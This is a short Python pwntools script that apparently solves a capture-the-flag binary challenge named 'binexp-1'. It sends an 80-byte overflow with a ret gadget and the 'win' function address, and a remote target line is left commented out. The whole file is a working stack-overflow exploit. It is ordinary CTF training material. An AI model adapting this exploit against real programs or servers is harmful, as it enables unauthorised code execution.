#!/usr/bin/env python3
from pwn import *

elf = ELF('./binexp-1')
rop = ROP(elf)

p = elf.process()
#p = remote('54.255.236.13', 9001)

def exploit():

    padding = b'A'*80
    ret = (rop.find_gadget(['ret']))[0]
    flag = elf.symbols['win']

    payload = padding
    payload += p32(ret)
    payload += p32(flag)

    print(p.recvuntil(b'?'))

    print(payload)
    p.sendline(payload)

    p.interactive()


def main():
    exploit()

if __name__ == "__main__":
    main()